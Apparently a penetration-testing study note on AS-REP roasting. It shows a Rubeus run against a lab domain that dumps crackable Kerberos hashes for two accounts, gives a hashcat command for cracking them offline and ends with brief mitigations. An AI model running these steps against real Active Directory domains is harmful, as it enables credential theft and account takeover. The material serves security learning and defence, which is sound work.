# AS-REP Roasting w/ Rubeus
- AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled
- `pre-authentication disabled` or `do not require Kerberos preauthentication`

![Alt text](<../../Images/AS-REP Roasting.png>)

## AS-REP Roasting Overview
- During pre-authentication, the users hash will be used to encrypt a timestamp that the DC will attempt to decrypt to validate that the right hash is being used
- After validating the timestamp, the KDC will then issue a TGT for user
- If `pre-authentication` is disabled, you can request any authentication data for any user
- KDC will return an encrypted TGT that can be cracked offline
- KDC skips the step of validating that the user is validated (say who they say they are)

<pre>controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe asreproast

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::8422:23f8:a610:8a98%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:37C263DF50A998726A1781DD74E796EA$0D29632069B3
      EA626EE0BD352E1AAABABDAC07334819CA8D466CF0D593AAD15681509532189B919314F95923DAE9
      450D0C7B96EE6C0DE9023DD82488924CA1A99BAE17EA7707134BC1A3CD084479F1B76D02E60855D9
      E9CAEACBC77691A906A80712F158BD71A3295E7739A99BFE4E3DD0360C39C10BD928D0DD0F0267F5
      A078C1839F64C0FEF5B35CF1036CBA7C7C83D7587B71CEABCC96E03B2E8A07631CA5CD26DAD65AD7
      5E8EE81A25BA25F841C53812E6307963DE716664B84E1493E1311A3951700DEC2C4F019B9B27F93E
      276F16BFFDA6FEF14BDBB3446250285846A06FDD9D0AB51AB5396FA98ED23A90FF3A0CE5FC01

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::8422:23f8:a610:8a98%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:997665FED2113BAB00EDFF29BF674DA5$42037DA28E43B
      D332CC243A288422C53E4D794569635BB74FC489EE9B541318F848F497089DF462A5475E44D8721C
      0B688A056D09FF324906C32460AC0CC7FEF4748F6E0224CA0D29896239FDC8089E6643C7DA351FF0
      7334867D0C06CEC093F17879A3C29912F9DA76CA8C8604FD856DCA0C050C902976CE44155B7C1857
      4B9AB3C798E359245631D7B92EA9B30E22D92A1699EE140F6319C93678FF8EF5106644FD712563AF
      8830C1C425FEA7A5B5E3D0B0E8EDFBF81ADD4B7525177B0AF2FE8EED61197986127A565CD9582FC1
      9356B6BE6C01962596F47DE5220D70684400311A8F2C4E41654782563A5276DAB4B6F6097E4</pre>

## Crack the hash using Hashcat
- Insert 23$ after krb5asrep$

<pre>hashcat -m 18200 hash.txt passwordlist.txt</pre>

## AS-REP Roasting Mitigations
- Have a strong password policy
- Don't turn off Kerberos pre-authentication unless necessary